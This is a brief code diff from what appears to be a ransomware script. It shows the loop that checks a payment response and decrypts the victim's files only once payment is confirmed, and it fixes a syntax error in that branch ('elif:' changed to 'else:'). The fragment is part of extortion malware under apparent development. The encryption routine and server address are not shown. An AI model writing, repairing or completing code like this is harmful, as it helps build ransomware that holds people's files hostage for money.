@@ -53,7 +53,7 @@ for i in range(100):
     jsonPaid = responsePaid.json()
     if jsonPaid["paid"] == 1:
         encryptionManager.manage(1, rootDirectionary, key) #decypts the files.
-    elif:
+    else:
         print("Nothing paid yet")    
 
 
